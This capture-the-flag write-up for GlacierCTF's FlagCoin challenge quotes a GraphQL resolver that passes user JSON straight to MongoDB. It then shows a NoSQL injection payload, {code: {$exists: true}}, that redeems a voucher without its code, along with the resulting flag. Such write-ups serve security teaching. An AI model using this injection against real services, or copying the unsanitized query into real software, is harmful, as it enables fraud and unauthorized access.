# Challenge

Now that you are logged, can you obtain some FlagCoins?

https://flagcoin.ctf.glacierctf.com

# Writeup

We need to redeem a voucher, but we do not know the code. Here is the relevant code:

```js
const redeem = ({ voucher }, { req }) => {
  return auth.getUser(req)
    .then(user => {
      if(!user) {
        throw new Error("You must be logged in");
      }
      return db.Voucher.findOne({ code: voucher.code }).lean().exec()
        .then(dbvoucher => {
          if(!dbvoucher) {
            throw new Error("Voucher does not exist");
          }
          user.coins += dbvoucher.coins;
          // "TODO" delete voucher
          return dbvoucher;
        })
  })
  .catch(e => {
    throw new Error("Error occured "+e);
  });
};
```

The database is MongoDB, which means we can use conditions to the query. If we can set the query to `{code: {$exists: true}}`, we can find the voucher without knowing the correct code.

Fortunately, the GraphQL mutation uses JSON argument. We can easily capture the flag via:

```js
graphql("mutation($voucher: JSON!) {redeem(voucher: $voucher) {coins message} }", {voucher: {code: {$exists: true}}}).await
// => glacierctf{th4nk_y0u_for_p4r7icip4ting_at_0ur_get_p00r_qu1ck_sch3m3}
```

# Conclusion

Do not pass arbitrary value from user to MongoDB.